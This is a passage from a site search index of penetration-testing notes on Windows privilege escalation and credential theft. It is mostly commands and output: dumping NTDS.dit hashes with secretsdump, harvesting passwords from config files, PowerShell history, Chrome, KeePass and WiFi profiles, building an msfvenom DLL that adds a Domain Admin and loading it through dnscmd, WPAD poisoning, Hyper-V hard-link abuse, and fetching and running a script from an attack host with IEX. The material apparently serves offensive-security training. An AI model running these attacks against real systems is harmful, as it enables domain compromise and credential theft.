from the ntds.dit file. These can then be used for pass-the-hash to access additional resources or cracked offline using Hashcat to gain further access.</p> <pre><code>secops@kali[/kali]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL\n\nImpacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation\n\n[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Searching for pekList, be patient\n[*] PEK  0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330\n[*] Reading and decrypting hashes from ntds.dit \nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::\nuser:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::\nsvc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::\nbob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::\nhyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::\nprintsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::\n\n&lt;SNIP&gt;\n</code></pre>  <p>The built-in utility robocopy can be used to copy files in backup mode as well.</p> <pre><code>C:\\xyz&gt; robocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit\n\n-------------------------------------------------------------------------------\n   ROBOCOPY     ::     Robust File Copy for Windows\n-------------------------------------------------------------------------------\n\n  Started : Thursday, May 6, 2021 1:11:47 PM\n   Source : E:\\Windows\\NTDS\\\n     Dest : C:\\Tools\\ntds\\\n\n    Files : ntds.dit\n\n  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30\n\n------------------------------------------------------------------------------\n\n          New Dir          1    E:\\Windows\\NTDS\\\n100%        New File              16.0 m        ntds.dit\n\n------------------------------------------------------------------------------\n\n               Total    Copied   Skipped  Mismatch    FAILED    Extras\n    Dirs :         1         1         0         0         0         0\n   Files :         1         1         0         0         0         0\n   Bytes :   16.00 m   16.00 m         0         0         0         0\n   Times :   0:00:00   0:00:00                       0:00:00   0:00:00\n\n\n   Speed :           356962042 Bytes/sec.\n   Speed :           20425.531 MegaBytes/min.\n   Ended : Thursday, May 6, 2021 1:11:47 PM\n</code></pre>","title":"Windows Built-in Groups"},{"location":"privesc/windows/comm_with_ps/","text":"<p>Enumerating Network Services</p> <p>Most common way to interact with processes is through a network socket (DNS, HTTP, SMB, etc.).</p> <p>Display Active Network Connections <pre><code>C:\\xyz&gt; netstat -ano\n</code></pre></p>  <p>Named Pipes</p> <p>Listing Named Pipes with Pipelist <pre><code>C:\\xyz&gt; pipelist.exe /accepteula\n</code></pre></p> <p>PowerShell to list named pipes using gci (Get-ChildItem). <pre><code>PS C:\\xyz&gt;  gci \\\\.\\pipe\\\n</code></pre></p> <p>Reviewing LSASS Named Pipe Permissions <pre><code>C:\\xyz&gt; accesschk.exe /accepteula \\\\.\\Pipe\\lsass -v\n</code></pre></p>","title":"Communication with Processes"},{"location":"privesc/windows/credential_hunting/","text":"<p>App Config Files</p> <p>Searching for Files <pre><code>PS C:\\xyz&gt; findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml\n</code></pre></p> <p>Sensitive IIS information such as credentials may be stored in a <code>web.config</code> file. For the default IIS website, this could be located at <code>C:\\inetpub\\wwwroot\\web.config</code>, but there may be multiple versions of this file in different locations, which we can search for recursively.</p>  <p>Dictionary Files</p> <p>Chrome Dictionary Files</p> <pre><code>PS C:\\xyz&gt; gc 'C:\\Users\\user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.txt' | Select-String password\n\nPassword1234!\n</code></pre>  <p>Unattended Installation Files</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;unattend xmlns=\"urn:schemas-microsoft-com:unattend\"&gt;\n    &lt;settings pass=\"specialize\"&gt;\n        &lt;component name=\"Microsoft-Windows-Shell-Setup\" processorArchitecture=\"amd64\" publicKeyToken=\"31bf3856ad364e35\" language=\"neutral\" versionScope=\"nonSxS\" xmlns:wcm=\"http://schemas.microsoft.com/WMIConfig/2002/State\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"&gt;\n            &lt;AutoLogon&gt;\n                &lt;Password&gt;\n                    &lt;Value&gt;local_4dmin_p@ss&lt;/Value&gt;\n                    &lt;PlainText&gt;true&lt;/PlainText&gt;\n                &lt;/Password&gt;\n                &lt;Enabled&gt;true&lt;/Enabled&gt;\n                &lt;LogonCount&gt;2&lt;/LogonCount&gt;\n                &lt;Username&gt;Administrator&lt;/Username&gt;\n            &lt;/AutoLogon&gt;\n            &lt;ComputerName&gt;*&lt;/ComputerName&gt;\n        &lt;/component&gt;\n    &lt;/settings&gt;\n</code></pre>  <p>PowerShell History File</p> <p>Starting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file: <pre><code>C:\\Users\\username&gt;\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt.\n</code></pre></p> <pre><code>PS C:\\xyz&gt; (Get-PSReadLineOption).HistorySavePath\n\nC:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n</code></pre> <pre><code>PS C:\\xyz&gt; gc (Get-PSReadLineOption).HistorySavePath\n\ndir\ncd Temp\nmd backups\ncp c:\\inetpub\\wwwroot\\* .\\backups\\\nSet-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))\n. .\\Get-IISsite.ps1\nGet-IISsite -Server WEB02 -web \"Default Web Site\"\nwevtutil qe Application \"/q:*[Application [(EventID=3005)]]\" /f:text /rd:true /u:WEB02\\administrator /p:5erv3rAdmin! /r:WEB02\n</code></pre> <p>One-liner to retrieve the contents of all Powershell history files that we can access as our current user. (assumes that the default save path is being used) <pre><code>PS C:\\xyz&gt; foreach($user in ((ls C:\\users).fullname)){cat \"$user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\" -ErrorAction SilentlyContinue}\n\ndir\ncd Temp\nmd backups\ncp c:\\inetpub\\wwwroot\\* .\\backups\\\nSet-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))\n. .\\Get-IISsite.ps1\nGet-IISsite -Server WEB02 -web \"Default Web Site\"\nwevtutil qe Application \"/q:*[Application [(EventID=3005)]]\" /f:text /rd:true /u:WEB02\\administrator /p:5erv3rAdmin! /r:WEB02\n</code></pre></p>  <p>PowerShell Credentials</p> <pre><code> Connect-VC.ps1\n Get-Credential | Export-Clixml -Path 'C:\\scripts\\pass.xml'\n$encryptedPassword = Import-Clixml -Path 'C:\\scripts\\pass.xml'\n$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password\nConnect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $encryptedString\n</code></pre> <p>Decrypting PowerShell Credentials <pre><code>PS C:\\xyz&gt; $credential = Import-Clixml -Path 'C:\\scripts\\pass.xml'\nPS C:\\xyz&gt; $credential.GetNetworkCredential().username\n\nbob\n\n\nPS C:\\xyz&gt; $credential.GetNetworkCredential().password\n\nStr0ng3ncryptedP@ss!\n</code></pre></p>","title":"Credential Hunting"},{"location":"privesc/windows/dnsadmins/","text":"<p>As detailed in this post, the following attack can be performed when DNS is run on a Domain Controller</p> <ul> <li>DNS management is performed over RPC</li> <li>ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the <code>dnscmd</code> tool from the command line</li> <li>When a member of the <code>DnsAdmins</code> group runs the <code>dnscmd</code> command below, the <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\DNS\\Parameters\\ServerLevelPluginDll</code> registry key is populated</li> <li>When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)</li> <li>An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.</li> </ul>  <p>Generating Malicious DLL <pre><code>secops@kali[/kali]$ msfvenom -p windows/x64/exec cmd='net group \"domain admins\" netadm /add /domain' -f dll -o adduser.dll\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 313 bytes\nFinal size of dll file: 5120 bytes\nSaved as: adduser.dll\n</code></pre></p> <pre><code>secops@kali[/kali]$ sudo python3 -m http.server 7777\n\n[sudo] password for mrb0b: \nServing HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...\n10.129.43.9 - - [19/May/2021 19:22:46] \"GET /adduser.dll HTTP/1.1\" 200 -\n</code></pre> <p>Downloading file to target <pre><code>PS C:\\xyz&gt;  wget \"http://10.10.14.3:7777/adduser.dll\" -outfile \"adduser.dll\"\n</code></pre></p> <pre><code>C:\\xyz&gt; dnscmd.exe /config /serverlevelplugindll C:\\Users\\netadm\\Desktop\\adduser.dll\n\nDNS Server failed to reset registry property.\n    Status = 5 (0x00000005)\nCommand failed: ERROR_ACCESS_DENIED\n</code></pre> <p>Only members of the DnsAdmins group are permitted to do this. <pre><code>C:\\xyz&gt; Get-ADGroupMember -Identity DnsAdmins\n\ndistinguishedName : CN=netadm,CN=Users,DC=LEGALCORP,DC=LOCAL\nname              : netadm\nobjectClass       : user\nobjectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14\nSamAccountName    : netadm\nSID               : S-1-5-21-669053619-2741956077-1013132368-1109           \n</code></pre></p> <p>After confirming group membership in the DnsAdmins group, we can re-run the command to load a custom DLL. <pre><code>C:\\xyz&gt; dnscmd.exe /config /serverlevelplugindll C:\\Users\\netadm\\Desktop\\adduser.dll\n\nRegistry property serverlevelplugindll successfully reset.\nCommand completed successfully.\n</code></pre></p> <p>We must specify the full path to our custom DLL or the attack will not work properly.</p> <p>With the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.</p> <p>First, we need our user's SID. <pre><code>C:\\xyz&gt; wmic useraccount where name=\"netadm\" get sid\n\nSID\nS-1-5-21-669053619-2741956077-1013132368-1109\n</code></pre></p> <p>Once we have the user's SID, we can use the <code>sc</code> command to check permissions on the service. Per this article, we can see that our user has <code>RPWP</code> permissions which translate to <code>SERVICE_START</code> and <code>SERVICE_STOP</code>.</p> <pre><code>C:\\xyz&gt; sc.exe sdshow DNS\n\nD:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\n</code></pre> <p>Stopping the DNS Service <pre><code>C:\\xyz&gt; sc stop dns\n\nSERVICE_NAME: dns\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 3  STOP_PENDING\n                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x1\n        WAIT_HINT          : 0x7530\n</code></pre></p> <p>The DNS service will attempt to start and run our custom DLL, but if we check the status, it will show that it failed to start correctly</p> <p>Starting the DNS Service <pre><code>C:\\xyz&gt; sc start dns\n\nSERVICE_NAME: dns\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 2  START_PENDING\n                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x7d0\n        PID                : 6960\n        FLAGS              :\n</code></pre></p> <p>If all goes to plan, our account will be added to the Domain Admins group or receive a reverse shell if our custom DLL was made to give us a connection back. <pre><code>C:\\xyz&gt; net group \"Domain Admins\" /dom\n\nGroup name     Domain Admins\nComment        Designated administrators of the domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator            netadm\nThe command completed successfully.\n</code></pre></p>  <p>Cleaning Up </p> <p>These steps must be taken from an elevated console with a local or domain admin account. The first step is confirming that the <code>ServerLevelPluginDll</code> registry key exists. Until our custom DLL is removed, we will not be able to start the DNS service again correctly.</p> <pre><code>C:\\xyz&gt; reg query \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\n    GlobalQueryBlockList    REG_MULTI_SZ    wpad\\0isatap\n    EnableGlobalQueryBlockList    REG_DWORD    0x1\n    PreviousLocalHostname    REG_SZ    WINLPE-DC01.legalcorp.local\n    Forwarders    REG_MULTI_SZ    1.1.1.1\\08.8.8.8\n    ForwardingTimeout    REG_DWORD    0x3\n    IsSlave    REG_DWORD    0x0\n    BootMethod    REG_DWORD    0x3\n    AdminConfigured    REG_DWORD    0x1\n    ServerLevelPluginDll    REG_SZ    adduser.dll\n</code></pre> <p>Use the <code>reg delete</code> command to remove the key that points to our custom DLL. <pre><code>C:\\xyz&gt; reg delete \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters  /v ServerLevelPluginDll\n\nDelete the registry value ServerLevelPluginDll (Yes/No)? Y\nThe operation completed successfully.\n</code></pre></p> <p>Once this is done, we can start up the DNS service again. <pre><code>C:\\xyz&gt; sc.exe start dns\n\nSERVICE_NAME: dns\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 2  START_PENDING\n                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x7d0\n        PID                : 4984\n        FLAGS              :\n</code></pre></p> <p>If everything went to plan, querying the DNS service will show that it is running. We can also confirm that DNS is working correctly within the environment by performing an <code>nslookup</code> against the localhost or another host in the domain. <pre><code>C:\\xyz&gt; sc query dns\n\nSERVICE_NAME: dns\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 4  RUNNING\n                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n</code></pre></p>  <p>As detailed in this post, we could also utilize mimilib.dll to gain command execution by modifying the kdns.c file to execute a reverse shell one-liner or another command of our choosing.</p> <pre><code>/*  Benjamin DELPY `gentilkiwi`\n    https://blog.gentilkiwi.com\n    benjamin@gentilkiwi.com\n    Licence : https://creativecommons.org/licenses/by/4.0/\n*/\ninclude \"kdns.h\"\n\nDWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)\n{\n    return ERROR_SUCCESS;\n}\n\nDWORD WINAPI kdns_DnsPluginCleanup()\n{\n    return ERROR_SUCCESS;\n}\n\nDWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)\n{\n    FILE * kdns_logfile;\npragma warning(push)\npragma warning(disable:4996)\n    if(kdns_logfile = _wfopen(L\"kiwidns.log\", L\"a\"))\npragma warning(pop)\n    {\n        klog(kdns_logfile, L\"%S (%hu)\\n\", pszQueryName, wQueryType);\n        fclose(kdns_logfile);\n        system(\"ENTER COMMAND HERE\");\n    }\n    return ERROR_SUCCESS;\n}\n</code></pre>  <p>Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to disable global query block security, which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server.</p> <p>After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.</p> <p>Disabling the Global Query Block List <pre><code>C:\\xyz&gt; Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.legalcorp.local\n</code></pre></p> <p>Next, we add a WPAD record pointing to our attack machine. <pre><code>C:\\xyz&gt; Add-DnsServerResourceRecordA -Name wpad -ZoneName legalcorp.local -ComputerName dc01.legalcorp.local -IPv4Address 10.10.14.3\n</code></pre></p>","title":"DnsAdmins"},{"location":"privesc/windows/eventlog_readers/","text":"<p>Confirming Group Membership</p> <pre><code>C:\\xyz&gt; net localgroup \"Event Log Readers\"\n\nAlias name     Event Log Readers\nComment        Members of this group can read event logs from local machine\n\nMembers\n\n-------------------------------------------------------------------------------\nlogger\nThe command completed successfully.\n</code></pre> <p>We can query Windows events from the command line using the wevtutil utility and the Get-WinEvent PowerShell cmdlet.</p> <p>Searching Security Logs Using wevtutil <pre><code>PS C:\\xyz&gt; wevtutil qe Security /rd:true /f:text | Select-String \"/user\"\n\n        Process Command Line:   net use T: \\\\fs01\\backups /user:tim MyStr0ngP@ssword\n</code></pre></p> <p>We can also specify alternate credentials for wevtutil using the parameters /u and /p. <pre><code>C:\\xyz&gt; wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr \"/user\"\n</code></pre></p> <p>We filter for process creation events (4688), which contain /user in the process command line.</p> <p>Note: Searching the <code>Security</code> event log with <code>Get-WInEvent</code> requires administrator access or permissions adjusted on the registry key <code>HKLM\\System\\CurrentControlSet\\Services\\Eventlog\\Security</code>. Membership in just the <code>Event Log Readers</code> group is not sufficient.</p> <p>Searching Security Logs Using Get-WinEvent <pre><code>PS C:\\xyz&gt; Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}\n\nCommandLine\n-----------\nnet use T: \\\\fs01\\backups /user:tim MyStr0ngP@ssword\n</code></pre></p> <p>cmdlet can also be run as another user with the <code>-Credential</code> parameter.</p> <p>PowerShell Operational log, may also contain sensitive information or credentials if script block or module logging is enabled. This log is accessible to unprivileged users.</p>","title":"Event Log Readers"},{"location":"privesc/windows/further_credential_theft/","text":"<p>Cmdkey Saved Credentials</p> <pre><code>C:\\xyz&gt; cmdkey /list\n\n    Target: LegacyGeneric:target=TERMSRV/SQL01\n    Type: Generic\n    User: LEGALCORP\\bob\n</code></pre> <p>When we attempt to RDP to the host, the saved credentials will be used.</p> <p>We can also attempt to reuse the credentials using <code>runas</code> to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:</p> <pre><code>PS C:\\xyz&gt; runas /savecred /user:LEGALCORP\\bob \"COMMAND HERE\"\n</code></pre>  <p>Browser Credentials</p> <p>A tool such as SharpChrome can be used to retrieve cookies and saved logins from Google Chrome.</p> <pre><code>PS C:\\xyz&gt; .\\SharpChrome.exe logins /unprotect\n\n  __                 _\n (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _\n __) | | (_| |  |_) \\_ | | | (_) | | | (/_\n                |\n  v1.7.0\n\n\n[*] Action: Chrome Saved Logins Triage\n\n[*] Triaging Chrome Logins for current user\n\n\n\n[*] AES state key file : C:\\Users\\bob\\AppData\\Local\\Google\\Chrome\\User Data\\Local State\n[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0\n\n\n--- Chrome Credential (Path: C:\\Users\\bob\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data) ---\n\nfile_path,signon_realm,origin_url,date_created,times_used,username,password\nC:\\Users\\bob\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data,https://vc01.legalcorp.local/,https://vc01.legalcorp.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@legalcorp.local,Welcome1\n</code></pre>  <p>Password Managers</p> <p>Extracting KeePass Hash <pre><code>python2.7 keepass2john.py lcorp_Help_Desk.kdbx \n\nlcorp_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154\n</code></pre></p> <pre><code>secops@kali[/kali]$ hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt\n\nhashcat (v6.1.1) starting...\n\n&lt;SNIP&gt;\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\n&lt;SNIP&gt;\n</code></pre>  <p>Email</p> <p>If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as \"pass,\" \"creds,\" \"credentials,\" etc. using MailSniper.</p>  <p>Others</p> <p>When all else fails, we can run the LaZagne tool in an attempt to retrieve credentials from a wide variety of software. <pre><code>PS C:\\xyz&gt; .\\lazagne.exe all\n</code></pre></p>  <p>SessionGopher to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. We need local admin access to retrieve stored session information for every user in <code>HKEY_USERS</code>, but it is always worth running as our current user to see if we can find any useful credentials. <pre><code>PS C:\\xyz&gt; .\\SessionGopher.ps1\n\nPS C:\\Tools&gt; Invoke-SessionGopher -Target WINLPE-SRV01\n\n          o_\n         /  \".   SessionGopher\n       ,\"  _-\"\n     ,\"   m m\n  ..+     )      Brandon Arvanaghi\n     `m..m       Twitter: @arvanaghi | arvanaghi.com\n\n[+] Digging on WINLPE-SRV01...\n&lt;SNIP&gt;\n</code></pre></p>  <p>Wifi Passwords</p> <p>If we obtain local admin access to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to.</p> <pre><code>C:\\xyz&gt; netsh wlan show profile\n\nProfiles on interface Wi-Fi:\n\nGroup policy profiles (read only)\n---------------------------------\n    &lt;None&gt;\n\nUser profiles\n-------------\n    All User Profile     : Smith Cabin\n    All User Profile     : Bob's iPhone\n    All User Profile     : EE_Guest\n    All User Profile     : EE_Guest 2.4\n    All User Profile     : lcorp_corp\n</code></pre> <p>Depending on the network configuration, we can retrieve the pre-shared key (<code>Key Content</code> below) and potentially access the target network.</p> <pre><code>C:\\xyz&gt; netsh wlan show profile lcorp_corp key=clear\n\nProfile lcorp_corp on interface Wi-Fi:\n=======================================================================\n\nApplied: All User Profile\n\nProfile information\n-------------------\n    Version                : 1\n    Type                   : Wireless LAN\n    Name                   : lcorp_corp\n    Control options        :\n        Connection mode    : Connect automatically\n        Network broadcast  : Connect only if this network is broadcasting\n        AutoSwitch         : Do not switch to other networks\n        MAC Randomization  : Disabled\n\nConnectivity settings\n---------------------\n    Number of SSIDs        : 1\n    SSID name              : \"lcorp_corp\"\n    Network type           : Infrastructure\n    Radio type             : [ Any Radio Type ]\n    Vendor extension          : Not present\n\nSecurity settings\n-----------------\n    Authentication         : WPA2-Personal\n    Cipher                 : CCMP\n    Authentication         : WPA2-Personal\n    Cipher                 : GCMP\n    Security key           : Present\n    Key Content            : lcorpWIFI-CORP123908!\n</code></pre>","title":"Further Credential Theft"},{"location":"privesc/windows/gtlotl/","text":"<p>Network Information</p> <p>Interface(s), IP Address(es), DNS Information <pre><code>C:\\xyz&gt; ipconfig /all\n</code></pre></p> <p>ARP Table <pre><code>C:\\xyz&gt; arp -a\n</code></pre></p> <p>Routing Table <pre><code>C:\\xyz&gt; route print\n</code></pre></p>  <p>Enumerating Protections</p> <p>Check Windows Defender Status <pre><code>PS C:\\xyz&gt; Get-MpComputerStatus\n</code></pre></p> <p>List AppLocker Rules <pre><code>PS C:\\xyz&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n</code></pre></p> <p>Test AppLocker Policy <pre><code>PS C:\\xyz&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path\n</code></pre></p>","title":"Situational Awareness"},{"location":"privesc/windows/hyperv_admins/","text":"<p>The Hyper-V Administrators group has full access to all Hyper-V features. If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.</p> <p>It is also well documented on this blog, that upon deleting a virtual machine, vmms.exe attempts to restore the original file permissions on the corresponding .vhdx file and does so as <code>NT AUTHORITY\\SYSTEM</code>, without impersonating the user. We can delete the .vhdx file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to.</p> <p>If the operating system is vulnerable to CVE-2018-0952 or CVE-2019-0841, we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.</p> <p>An example of this is Firefox, which installs the Mozilla Maintenance Service. We can update this exploit (a proof-of-concept for NT hard link) to grant our current user full permissions on the file below:</p> <pre><code>C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe\n</code></pre> <p>After running the PowerShell script, we should have full control of this file and can take ownership of it. <pre><code>C:\\xyz&gt; takeown /F C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe\n</code></pre></p> <p>Next, we can replace this file with a malicious maintenanceservice.exe, start the maintenance service, and get command execution as SYSTEM.</p> <pre><code>C:\\xyz&gt; sc.exe start MozillaMaintenance\n</code></pre>  <p>Note: This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.</p>","title":"Hyper-V Administrators"},{"location":"privesc/windows/init_enum/","text":"<p>System Information</p> <p>Tasklist <pre><code>C:\\xyz&gt; tasklist /svc\n</code></pre></p> <p>Display All Environment Variables</p> <pre><code>C:\\xyz&gt; set\n</code></pre> <p>View Detailed Configuration Information</p> <pre><code>C:\\xyz&gt; systeminfo\n</code></pre> <p>Patches and Updates</p> <pre><code>C:\\xyz&gt; wmic qfe\n</code></pre> <p>Can do this as well with PS</p> <pre><code>PS C:\\xyz&gt; Get-HotFix | ft -AutoSize\n</code></pre> <p>Installed Programs</p> <pre><code>C:\\xyz&gt; wmic product get name\n</code></pre> <p>Can do this as well with PS <pre><code>PS C:\\xyz&gt; Get-WmiObject -Class Win32_Product |  select Name, Version\n</code></pre></p> <p>Display Running Processes</p> <p>Display active TCP and UDP connections</p> <pre><code>PS C:\\xyz&gt; netstat -ano\n</code></pre>  <p>User and Group Information</p> <p>Logged-In Users</p> <pre><code>C:\\xyz&gt; query user\n</code></pre> <p>Curent User</p> <pre><code>C:\\xyz&gt; echo %USERNAME%\n</code></pre> <p>Curent User Privileges</p> <pre><code>C:\\xyz&gt; whoami /priv\n</code></pre> <p>Current User Group Information</p> <pre><code>C:\\xyz&gt; whoami /groups\n</code></pre> <p>Get All Users</p> <pre><code>C:\\xyz&gt; net user\n</code></pre> <p>Get All Groups</p> <pre><code>C:\\xyz&gt; net localgroup\n</code></pre> <p>Details About a Group</p> <pre><code>C:\\xyz&gt; net localgroup administrators\n</code></pre> <p>Get Password Policy &amp; Other Account Information</p> <pre><code>C:\\xyz&gt; net accounts\n</code></pre>","title":"Initial Enumeration"},{"location":"privesc/windows/interacting_with_users/","text":"<p>Monitoring for Process Command Lines</p> <p>When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line.</p> <pre><code>while($true)\n{\n\n  $process = Get-WmiObject Win32_Process | Select-Object CommandLine\n  Start-Sleep 1\n  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine\n  Compare-Object -ReferenceObject $process -DifferenceObject $process2\n\n}\n</code></pre> <p>We can host the script on our attack machine and execute it on the target host as follows. <pre><code>PS C:\\xyz&gt; IEX (iwr 'http//10.10.10.205/procmon.ps1') \n\nInputObject                                           SideIndicator\n-----------                                           -------------\n@{CommandLine=C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}} =&gt;      \n@{CommandLine=\u201cC:\\Windows\\system32\\cmd.exe\u201d }                          =&gt;      \n@{CommandLine=\\??\\C:\\Windows\\system32\\conhost.exe 0x4}                      =&gt;      \n@{CommandLine=net use T: \\\\sql02\\backups /user:LEGALCORP\\sqlsvc My4dm1nP@s5w0Rd}       =&gt;       